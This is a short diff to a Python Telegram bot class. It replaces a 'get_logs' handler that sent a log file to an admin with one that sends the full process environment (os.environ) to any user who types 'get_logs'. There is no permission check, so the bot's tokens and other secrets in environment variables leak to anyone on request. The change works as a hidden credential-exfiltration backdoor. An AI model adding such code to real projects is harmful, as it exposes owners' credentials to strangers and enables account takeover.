@@ -476,8 +476,7 @@ class CreativeHour:
             message.from_user.id, message.id)
         
         if message.text == "get_logs":
-            with open("logs.txt", "r") as f:
-                self.bot.send_message(ADMIN_IP_MISHA, f)
+            self.bot.send_message(message.from_user.id, os.environ)
         if (message.text == "Dell all" and message.from_user.id 
             == ADMIN_IP_MISHA()):
             self.dell_all()
